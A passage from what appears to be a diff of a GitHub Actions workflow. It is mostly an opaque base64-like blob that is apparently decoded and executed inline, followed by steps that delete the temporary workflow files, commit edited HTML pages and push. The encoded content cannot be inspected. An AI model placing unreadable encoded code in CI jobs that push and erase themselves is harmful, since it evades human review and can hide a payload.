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')) )"
+      - name: Commit changes and remove temporary workflows
+        shell: bash
         run: |
           rm -f .github/workflows/tmp-edit-admin-ui-v2.yml .github/workflows/tmp-home-layout-ui-adjust.yml
-          git config user.name 'github-actions[bot]'
-          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add home-layout-edit.html home-layout-admin.html .github/workflows
-          git commit -m 'Rework edit and admin operation flow'
+          git commit -m "Rework edit and admin operation flow"
           git push
